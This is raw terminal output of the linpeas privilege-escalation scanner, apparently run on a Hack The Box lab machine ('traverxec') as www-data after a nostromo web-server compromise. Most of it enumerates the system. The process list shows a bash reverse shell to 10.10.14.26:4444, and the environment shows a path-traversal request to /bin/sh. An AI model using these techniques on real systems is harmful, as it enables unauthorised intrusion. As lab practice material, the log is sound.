  [48;2;51;78;45m [48;2;49;75;43m[38;2;51;78;45m▄[48;2;30;38;27m[38;2;39;59;35m▄[48;2;63;123;49m[38;2;71;110;62m▄[48;2;54;121;37m[38;2;56;119;40m▄[48;2;68;198;37m[38;2;60;158;37m▄[48;2;73;218;37m[38;2;71;216;36m▄[48;2;73;217;37m[38;2;73;216;38m▄[48;2;91;206;58m[38;2;110;196;81m▄[48;2;122;191;95m[38;2;126;188;100m▄[48;2;128;186;102m[38;2;130;187;104m▄[48;2;140;180;116m[38;2;128;187;103m▄[48;2;126;188;100m[38;2;106;197;76m▄[48;2;96;202;64m[38;2;75;215;39m▄[48;2;73;217;37m[38;2;72;218;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;74;220;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;74;217;38m[38;2;73;217;37m▄[48;2;114;194;86m[38;2;76;215;40m▄[48;2;142;178;121m[38;2;94;205;62m▄[48;2;150;176;129m[38;2;109;196;81m▄[48;2;142;180;120m[38;2;95;203;63m▄[48;2;116;193;88m[38;2;76;214;41m▄[48;2;78;213;44m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;67;196;36m▄[48;2;71;209;37m[38;2;60;154;36m▄[48;2;59;152;36m[38;2;57;138;37m▄[48;2;52;110;38m[38;2;56;130;37m▄[48;2;51;104;38m[38;2;30;71;21m▄[48;2;20;31;17m[38;2;45;69;39m▄[48;2;50;78;44m[38;2;51;78;45m▄[48;2;51;78;45m [0m
  [48;2;51;78;45m[38;2;28;43;24m▄[48;2;51;78;45m[38;2;43;64;38m▄[48;2;51;78;45m[38;2;52;79;46m▄[48;2;34;53;30m[38;2;46;71;41m▄[48;2;64;124;48m[38;2;49;106;36m▄[48;2;53;115;38m[38;2;57;124;40m▄[48;2;63;175;36m[38;2;55;126;38m▄[48;2;73;217;37m[38;2;66;186;36m▄[48;2;89;208;56m[38;2;73;217;37m▄[48;2;111;195;82m[38;2;75;215;40m▄[48;2;109;197;80m[38;2;74;216;38m▄[48;2;85;209;52m[38;2;73;218;36m▄[48;2;73;216;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;217;36m[38;2;73;218;37m▄[48;2;73;218;37m[38;2;71;214;36m▄[48;2;71;212;36m[38;2;63;172;36m▄[48;2;63;174;35m[38;2;57;138;37m▄[48;2;58;146;36m[38;2;57;137;38m▄[48;2;58;139;37m[38;2;57;138;37m▄[48;2;58;138;37m[38;2;54;128;35m▄[48;2;50;117;34m[38;2;20;44;14m▄[48;2;20;32;17m[38;2;39;61;34m▄[48;2;51;77;44m[38;2;45;69;40m▄[48;2;51;78;45m[38;2;45;69;40m▄[48;2;51;78;45m[38;2;49;75;43m▄[0m
  [48;2;84;151;67m[38;2;98;177;78m▄[48;2;43;80;34m[38;2;98;177;78m▄[48;2;22;39;19m[38;2;98;178;78m▄[48;2;43;67;38m[38;2;81;148;64m▄[48;2;40;70;33m[38;2;44;78;36m▄[48;2;54;127;36m[38;2;21;47;15m▄[48;2;55;120;39m[38;2;54;117;39m▄[48;2;56;133;37m[38;2;59;133;40m▄[48;2;71;211;36m[38;2;61;164;37m▄[48;2;73;217;36m[38;2;71;211;36m▄[48;2;73;218;37m[38;2;72;218;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;72;217;36m▄[48;2;73;218;37m[38;2;67;203;34m▄[48;2;68;194;37m[38;2;40;116;21m▄[48;2;58;142;36m[38;2;8;21;5m▄[48;2;49;120;31m[38;2;6;10;5m▄[48;2;25;59;16m[38;2;73;108;65m▄[48;2;15;33;11m[38;2;95;157;79m▄[48;2;12;25;9m[38;2;97;175;77m▄[48;2;21;32;19m[38;2;99;179;79m▄[48;2;23;35;19m[38;2;98;178;78m▄[48;2;20;34;17m[38;2;98;178;78m▄[48;2;13;24;11m[38;2;98;178;78m▄[48;2;16;26;14m[38;2;98;177;78m▄[0m
  [48;2;97;176;77m[38;2;58;103;46m▄[48;2;98;177;78m[38;2;94;170;75m▄[48;2;98;177;78m[38;2;99;179;79m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;97;176;77m[38;2;98;177;78m▄[48;2;91;165;72m[38;2;98;177;78m▄[48;2;55;100;44m[38;2;98;177;78m▄[48;2;15;27;10m[38;2;92;168;73m▄[48;2;24;46;18m[38;2;76;138;61m▄[48;2;73;154;53m[38;2;54;96;43m▄[48;2;74;213;39m[38;2;24;48;18m▄[48;2;74;222;37m[38;2;20;55;11m▄[48;2;73;217;37m[38;2;31;91;16m▄[48;2;73;218;37m[38;2;49;145;24m▄[48;2;73;218;37m[38;2;68;201;35m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;74;220;37m▄[48;2;73;218;37m[38;2;73;219;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;220;37m▄[48;2;73;218;37m[38;2;72;214;37m▄[48;2;73;218;37m[38;2;63;187;32m▄[48;2;72;217;36m[38;2;41;120;22m▄[48;2;74;222;36m[38;2;21;52;13m▄[48;2;67;203;34m[38;2;39;62;34m▄[48;2;40;117;21m[38;2;64;103;54m▄[48;2;14;43;7m[38;2;72;126;57m▄[48;2;4;12;2m[38;2;87;156;69m▄[48;2;25;45;21m[38;2;97;174;78m▄[48;2;71;124;57m[38;2;99;177;80m▄[48;2;97;168;78m[38;2;94;170;75m▄[48;2;96;175;77m[38;2;103;177;84m▄[48;2;98;176;79m[38;2;109;183;90m▄[48;2;100;178;80m[38;2;112;185;94m▄[48;2;100;177;80m[38;2;111;184;92m▄[48;2;99;177;80m[38;2;107;182;89m▄[48;2;98;177;78m[38;2;105;182;85m▄[48;2;98;177;78m[38;2;103;180;83m▄[48;2;98;177;78m[38;2;99;177;79m▄[0m
   [48;2;99;106;96m[38;2;254;254;254m▄[48;2;54;79;47m[38;2;236;236;236m▄[48;2;72;123;60m[38;2;134;134;134m▄[48;2;97;176;78m[38;2;65;87;60m▄[48;2;98;177;78m[38;2;73;130;59m▄[48;2;98;177;78m[38;2;91;165;72m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;96;172;77m[38;2;98;177;78m▄[48;2;82;147;65m[38;2;98;177;78m▄[48;2;66;116;52m[38;2;98;177;78m▄[48;2;46;78;38m[38;2;98;177;78m▄[48;2;27;51;20m[38;2;98;177;78m▄[48;2;28;60;20m[38;2;94;169;74m▄[48;2;28;67;19m[38;2;86;155;69m▄[48;2;34;96;19m[38;2;69;123;54m▄[48;2;42;126;21m[38;2;48;86;39m▄[48;2;51;148;27m[38;2;36;64;28m▄[48;2;55;164;28m[38;2;26;46;20m▄[48;2;60;180;30m[38;2;23;39;18m▄[48;2;62;186;31m[38;2;21;40;17m▄[48;2;61;181;31m[38;2;19;36;16m▄[48;2;67;176;40m[38;2;18;32;14m▄[48;2;63;173;35m[38;2;23;36;19m▄[48;2;56;168;29m[38;2;27;42;23m▄[48;2;53;160;27m[38;2;29;45;24m▄[48;2;44;133;22m[38;2;30;53;25m▄[48;2;34;102;17m[38;2;52;89;43m▄[48;2;20;60;10m[38;2;88;148;71m▄[48;2;24;47;19m[38;2;97;171;78m▄[48;2;34;62;27m[38;2;98;177;78m▄[48;2;55;99;44m[38;2;98;177;78m▄[48;2;80;144;64m[38;2;98;177;78m▄[48;2;99;176;79m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;99;177;79m▄[48;2;99;177;79m[38;2;96;172;76m▄[48;2;99;175;79m[38;2;85;151;68m▄[48;2;95;169;76m[38;2;72;121;60m▄[48;2;109;180;92m[38;2;37;57;32m▄[48;2;100;159;85m[38;2;38;41;36m▄[48;2;72;107;62m[38;2;74;74;74m▄[48;2;44;65;38m[38;2;134;134;134m▄[48;2;31;48;27m[38;2;200;200;200m▄[48;2;31;48;26m[38;2;226;226;226m▄[48;2;31;52;25m[38;2;205;205;205m▄[48;2;41;71;34m[38;2;170;170;170m▄[48;2;59;97;50m[38;2;142;142;142m▄[0m
        [48;2;95;106;94m[38;2;253;253;253m▄[48;2;81;137;65m[38;2;243;243;243m▄[48;2;91;166;73m[38;2;182;185;181m▄[48;2;95;174;76m[38;2;61;73;59m▄[48;2;98;177;78m[38;2;33;66;26m▄[48;2;98;177;78m[38;2;81;143;65m▄[48;2;98;177;78m[38;2;102;182;81m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;99;179;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;97;177;77m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m[38;2;99;179;78m▄[48;2;98;177;78m[38;2;93;169;74m▄[48;2;98;177;78m[38;2;56;106;44m▄[48;2;96;174;77m[38;2;16;31;13m▄[48;2;68;126;54m[38;2;58;58;58m▄[48;2;28;50;23m[38;2;180;180;180m▄[48;2;20;22;20m[38;2;240;240;240m▄[48;2;86;85;86m[38;2;253;253;253m▄[48;2;199;199;199m[38;2;255;255;255m▄ [0m
             [48;2;146;147;145m[38;2;254;254;254m▄[48;2;41;52;39m[38;2;242;242;242m▄[48;2;39;76;30m[38;2;192;192;192m▄[48;2;73;136;57m[38;2;132;134;132m▄[48;2;90;162;72m[38;2;96;100;95m▄[48;2;99;175;79m[38;2;60;69;58m▄[48;2;98;177;78m[38;2;46;59;43m▄[48;2;98;177;78m[38;2;32;51;27m▄[48;2;98;178;78m[38;2;28;50;23m▄[48;2;98;178;78m[38;2;28;55;22m▄[48;2;98;178;78m[38;2;35;64;28m▄[48;2;98;177;78m[38;2;41;75;33m▄[48;2;98;177;78m[38;2;50;89;41m▄[48;2;98;177;77m[38;2;54;89;45m▄[48;2;98;177;77m[38;2;53;89;44m▄[48;2;98;177;78m[38;2;49;86;39m▄[48;2;98;177;78m[38;2;45;83;36m▄[48;2;98;177;78m[38;2;40;74;32m▄[48;2;98;177;78m[38;2;35;64;28m▄[48;2;98;178;78m[38;2;39;60;33m▄[48;2;90;163;71m[38;2;55;61;53m▄[48;2;53;97;41m[38;2;111;111;111m▄[48;2;24;44;19m[38;2;186;186;186m▄[48;2;36;41;35m[38;2;242;242;242m▄[48;2;132;131;132m[38;2;255;255;255m▄[0m
  [1;34m  linpeas v3.1.4 [1;33mby carlospolop
[0m
[1;33mADVISORY: [1;34mThis script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
[0m
[1;34mLinux Privesc Checklist: [1;33mhttps://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
[0m [1;4mLEGEND[0m:
  [1;31;103mRED/YELLOW[0m: 95% a PE vector
  [1;31mRED[0m: You must take a look at it
  [1;96mLightCyan[0m: Users with console
  [1;34mBlue[0m: Users without console & mounted devs
  [1;32mGreen[0m: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username

 [1;90mStarting linpeas. Caching Writable Folders...[0m

[1;34m════════════════════════════════════╣ [1;32mBasic information[1;34m ╠════════════════════════════════════
[0m[1;37mOS: [0mLinux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)
[1;37mUser & Groups: [0muid=33([1;34m[1;32m[1;95mwww-data[0m[0m[0m) gid=33([1;34m[1;32m[1;95mwww-data[0m[0m[0m) groups=33([1;34m[1;32m[1;95mwww-data[0m[0m[0m)
[1;37mHostname: [0mtraverxec
[1;37mWritable folder: [0m/dev/shm
[1;33m[+] [1;32m/usr/bin/ping[1;34m is available for network discovery[1;37m (linpeas can discover hosts, learn more with -h)
[0m[1;33m[+] [1;32m/usr/bin/nc[1;34m is available for network discover & port scanning[1;37m (linpeas can discover hosts and scan ports, learn more with -h)
[0m

[1;32mCaching directories using[1;33m 1[1;32m threads [0m[1;33mDONE
[0m
[1;34m════════════════════════════════════╣ [1;32mSystem Information[1;34m ╠════════════════════════════════════
[0m[1;33m[+] [1;32mOperative system
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
[0mLinux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)
Distributor ID:	Debian
Description:	Debian GNU/Linux 10 (buster)
Release:	10
Codename:	buster

[1;33m[+] [1;32mSudo version
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
[0mSudo version [1;31m1.8.27[0m

[1;33m[+] [1;32mUSBCreator
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
[0m
[1;33m[+] [1;32mPATH
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
[0m/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[1;33m[+] [1;32mDate
[0mSun Apr 11 18:13:58 EDT 2021

[1;33m[+] [1;32mSystem stats
[0mFilesystem      Size  Used Avail Use% Mounted on
udev            479M     0  479M   0% /dev
tmpfs            99M  6.5M   93M   7% /run
/dev/sda1       3.9G  1.5G  2.3G  40% /
tmpfs           494M  360K  493M   1% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
              total        used        free      shared  buff/cache   available
Mem:        1009948       62088      757588        6980      190272      793432
Swap:       1046524           0     1046524

[1;33m[+] [1;32mCPU info
[0mArchitecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
Address sizes:       43 bits physical, 48 bits virtual
CPU(s):              1
On-line CPU(s) list: 0
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           1
NUMA node(s):        1
Vendor ID:           AuthenticAMD
CPU family:          23
Model:               49
Model name:          AMD EPYC 7302P 16-Core Processor
Stepping:            0
CPU MHz:             2994.375
BogoMIPS:            5988.75
Hypervisor vendor:   VMware
Virtualization type: full
L1d cache:           32K
L1i cache:           32K
L2 cache:            512K
L3 cache:            131072K
NUMA node0 CPU(s):   0
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt clwb xsaveopt xsavec xsaves arat overflow_recov succor

[1;33m[+] [1;32mEnvironment
[0m[1;34m[i] [1;33mAny private information inside environment variables?
[0mGATEWAY_INTERFACE=CGI/1.1
HISTFILESIZE=0
SHLVL=1
REMOTE_ADDR=10.10.14.26
DOCUMENT_ROOT=/var/nostromo/htdocs
REMOTE_PORT=44260
PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$[1;31mPWD[0m\[\033[0m\]$ ")
SERVER_SIGNATURE=<address>nostromo 1.9.6 at 10.10.10.165 Port 80</address>
CONTENT_LENGTH=1
SCRIPT_FILENAME=/var/nostromo/htdocs/../../../../bin/sh
REQUEST_URI=/../../../../bin/sh
_=./linpeas.sh
SERVER_SOFTWARE=nostromo 1.9.6
TERM=xterm
HISTCONTROL=ignorespace
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_PROTOCOL=HTTP/1.1
HISTSIZE=0
REQUEST_METHOD=POST
SERVER_ADMIN=david@traverxec.htb
SERVER_ADDR=127.0.1.1
SERVER_PORT=80
SCRIPT_NAME=/../../../../bin/sh
HISTFILE=/dev/null
SERVER_NAME=traverxec.htb

[1;33m[+] [1;32mSearching Signature verification failed in dmseg
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mAppArmor enabled? .............. [0mYou do not have enough privilege to read the profile set.
apparmor module is loaded.
[1;33m[+] [1;32mgrsecurity present? ............ [0m[1;90mgrsecurity Not Found
[0m[1;33m[+] [1;32mPaX bins present? .............. [0m[1;90mPaX Not Found
[0m[1;33m[+] [1;32mExecshield enabled? ............ [0m[1;90mExecshield Not Found
[0m[1;33m[+] [1;32mSELinux enabled? ............... [0m[1;90msestatus Not Found
[0m[1;33m[+] [1;32mIs ASLR enabled? ............... [0m[1;32mYes[0m
[1;33m[+] [1;32mPrinter? ....................... [0m[1;90mlpstat Not Found
[0m[1;33m[+] [1;32mIs this a virtual machine? ..... [0m[1;31mYes (vmware)[0m
[1;33m[+] [1;32mIs this a container? ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mAny running containers? ........ [0m[1;90mNo
[0m

[1;34m═════════════════════════════════════════╣ [1;32mDevices[1;34m ╠══════════════════════════════════════════
[0m[1;33m[+] [1;32mAny sd*/disk* disk in /dev? (limit 20)
[0mdisk
sda
sda1
sda2
sda5

[1;33m[+] [1;32mUnmounted file-system?
[0m[1;34m[i] [1;33mCheck if you can mount umounted devices
[0m[1;34mUUID=b94f39a4-394e-4755-bdc1-205c141583a6[0m /               ext4    errors=remount-ro 0       1
UUID=4694341c-5642-4505-8593-0e44d799f109 none            [1;32mswap[0m    sw              0       0
/dev/sr0        /media[1;32m/cdrom[0m0   udf,iso9660[1;31m user[0m,noauto     0       0


[1;34m════════════════════════════════════╣ [1;32mAvailable Software[1;34m ╠════════════════════════════════════
[0m[1;33m[+] [1;32mUseful software
[0m/usr/bin/nc
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/sudo

[1;33m[+] [1;32mInstalled Compiler
[0m

[1;34m══════════════════════════════╣ [1;32mProcesses, Cron, Services, Timers & Sockets[1;34m ╠════════════════════════════════
[0m[1;33m[+] [1;32mCleaned processes
[0m[1;34m[i] [1;33mCheck weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
[0m[1;31mroot[0m         1  0.1  0.9 103804 10016 ?        Ss   17:53   0:01 /sbin[1;32m/init[0m
[1;31mroot[0m       249  0.0  0.8  32180  8228 ?        Ss   17:53   0:00 /lib/[1;34msys[0mtemd/systemd-journald
[1;31mroot[0m       268  0.0  0.4  21920  4936 ?        Ss   17:53   0:00 /lib/[1;34msys[0mtemd/systemd-[1;32mudev[0md
[1;31mroot[0m      1194  0.0  0.2  21920  2124 ?        S    18:13   0:00  _ /lib/[1;34msys[0mtemd/systemd-[1;32mudev[0md
[1;34msys[0mtemd+   408  0.0  0.6  93080  6416 ?        Ssl  17:53   0:00 /lib/systemd/systemd-timesyncd
  └─([1;90mCaps[0m) 0x0000000002000000=cap_sys_time
[1;31mroot[0m       410  0.0  0.2   8476  2584 ?        Ss   17:53   0:00 /usr/sbin/[1;32mcron[0m -f
[1;31mroot[0m       414  0.0  0.6  19304  6308 ?        Ss   17:53   0:00 /lib/[1;34msys[0mtemd/systemd-logind
[1;32mmessage+[0m   417  0.0  0.3   8980  3832 ?        Ss   17:53   0:00 /usr/bin/dbus-[1;34mdaemon[0m --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─([1;90mCaps[0m) 0x0000000020000000=cap_audit_write
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   419  0.0  0.2   8032  2400 ?        S    17:53   0:00 /usr/local/sbin/nhttpd
[1;31mroot[0m       423  0.0  0.1   5612  1748 tty1     Ss+  17:53   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
[1;31mroot[0m       424  0.0  0.6  15852  6640 ?        Ss   17:53   0:00 /usr/sbin/[1;34msshd[0m -D
[1;31mroot[0m       572  0.1  1.1 152648 11640 ?        Sl   17:53   0:01 /usr/sbin[1;32m/vmtoolsd[0m
[1;31mroot[0m       631  0.0  1.0  38660 10376 ?        S    17:53   0:00 /usr/lib/vmware-vgauth[1;32m/VGAuthService[0m -s
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   745  0.0  0.2   3736  2812 ?        S    18:00   0:00 bash -c bash -i >& 2>/dev/tcp/10.10.14.26/4444 0>&1
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   746  0.0  0.6  12336  6912 ?        S    18:00   0:00  _ /usr/bin/python -c import pty; pty.spawn('/usr/bin/bash')
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   830  0.0  0.3   4000  3356 pts/0    Ss   18:00   0:00      _ /usr/bin/bash
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1100  0.5  0.2   2724  2036 pts/0    S+   18:13   0:00          _ /bin/sh ./linpeas.sh
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1735  0.0  0.0   2724   480 pts/0    S+   18:13   0:00          |   _ /bin/sh ./linpeas.sh
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1739  0.0  0.2   7780  2788 pts/0    R+   18:13   0:00          |   |   _ ps fauxwww
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1738  0.0  0.0   2724   480 pts/0    S+   18:13   0:00          |   _ /bin/sh ./linpeas.sh
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1101  0.0  0.0   2300   688 pts/0    S+   18:13   0:00          _ tee lin_www.out

[1;33m[+] [1;32mBinary processes permissions
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
[0mlrwxrwxrwx 1 [1;32mroot[0m root       4 Oct 25  2019 /bin/sh -> dash
-rwxr-xr-x 1 [1;32mroot[0m root  145488 Aug 20  2019 /lib/[1;34msys[0mtemd/systemd-journald
-rwxr-xr-x 1 [1;32mroot[0m root  231560 Aug 20  2019 /lib/[1;34msys[0mtemd/systemd-logind
-rwxr-xr-x 1 [1;32mroot[0m root   55360 Aug 20  2019 /lib/[1;34msys[0mtemd/systemd-timesyncd
-rwxr-xr-x 1 [1;32mroot[0m root  678392 Aug 20  2019 /lib/[1;34msys[0mtemd/systemd-udevd
-rwxr-xr-x 1 [1;32mroot[0m root   64744 Jan 10  2019 /sbin/agetty
lrwxrwxrwx 1 [1;32mroot[0m root      20 Aug 20  2019 /sbin/init -> /lib/[1;34msys[0mtemd/systemd
-rwxr-xr-x 1 [1;32mroot[0m root 1168776 Apr 18  2019 /usr/bin/bash
-rwxr-xr-x 1 [1;32mroot[0m root  240680 Jun  9  2019 /usr/bin/dbus-[1;34m[1;32mdaemon[0m[0m
lrwxrwxrwx 1 [1;32mroot[0m root       7 Mar  4  2019 /usr/bin/python -> python2
lrwxrwxrwx 1 [1;32mroot[0m root      37 Nov 12  2019 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin64/appLoader
-r-xr-xr-x 1 [1;32mroot[0m bin    72984 Oct 25  2019 /usr/local/sbin/nhttpd
-rwxr-xr-x 1 [1;32mroot[0m root   55792 Jun 23  2019 /usr/sbin/cron
-rwxr-xr-x 1 [1;32mroot[0m root  807336 Oct  6  2019 /usr/sbin/[1;34msshd[0m
lrwxrwxrwx 1 [1;32mroot[0m root      37 Nov 12  2019 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin64/vmtoolsd

[1;33m[+] [1;32mFiles opened by processes belonging to other users
[0m[1;34m[i] [1;33mThis is usually empty because of the lack of privileges to read other user processes information
[0mCOMMAND    PID TID TASKCMD               USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

[1;33m[+] [1;32mProcesses with credentials in memory (root req)
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
[0m[1;90mgdm-password Not Found
[0m[1;90mgnome-keyring-daemon Not Found
[0m[1;90mlightdm Not Found
[0m[1;90mvsftpd Not Found
[0m[1;90mapache2 Not Found
[0m[1;90msshd Not Found
[0m
[1;33m[+] [1;32mCron jobs
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
[0m/usr/bin/crontab
[1;90mincrontab Not Found
[0m-rw-r--r-- 1 root root 1042 Jun 23  2019 /etc/crontab

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Oct 25  2019 .
drwxr-xr-x 73 root root 4096 Nov 12  2019 ..
-rw-r--r--  1 root root  102 Jun 23  2019 [1;32m.placeholder[0m

/etc/cron.daily:
total 36
drwxr-xr-x  2 root root 4096 Oct 25  2019 .
drwxr-xr-x 73 root root 4096 Nov 12  2019 ..
-rw-r--r--  1 root root  102 Jun 23  2019 [1;32m.placeholder[0m
-rwxr-xr-x  1 root root 1478 May 28  2019 [1;32mapt-compat[0m
-rwxr-xr-x  1 root root  355 Dec 29  2017 [1;32mbsdmainutils[0m
-rwxr-xr-x  1 root root 1187 Apr 18  2019 [1;32mdpkg[0m
-rwxr-xr-x  1 root root  377 Aug 28  2018 [1;32mlogrotate[0m
-rwxr-xr-x  1 root root 1123 Feb 10  2019 [1;32mman-db[0m
-rwxr-xr-x  1 root root  249 Sep 27  2017 [1;32mpasswd[0m

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Oct 25  2019 .
drwxr-xr-x 73 root root 4096 Nov 12  2019 ..
-rw-r--r--  1 root root  102 Jun 23  2019 [1;32m.placeholder[0m

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Oct 25  2019 .
drwxr-xr-x 73 root root 4096 Nov 12  2019 ..
-rw-r--r--  1 root root  102 Jun 23  2019 [1;32m.placeholder[0m

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Oct 25  2019 .
drwxr-xr-x 73 root root 4096 Nov 12  2019 ..
-rw-r--r--  1 root root  102 Jun 23  2019 [1;32m.placeholder[0m
-rwxr-xr-x  1 root root  813 Feb 10  2019 [1;32mman-db[0m

SHELL=/bin/sh
PATH=/usr/local/s[1;34mbin:[0m/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[1;33m[+] [1;32mServices
[0m[1;34m[i] [1;33mSearch for outdated versions
[0m [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  netfilter-persistent
 [ + ]  networking
 [ + ]  procps
 [ - ]  rsyslog
 [ + ]  ssh
 [ - ]  sudo
 [ + ]  udev
 [ + ]  vmware-tools

[1;33m[+] [1;32mSystemd PATH
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
[0mPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[1;33m[+] [1;32mAnalyzing .service files
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#services
[0m[1;32mYou can't write on systemd PATH[0m

[1;33m[+] [1;32mSystem timers
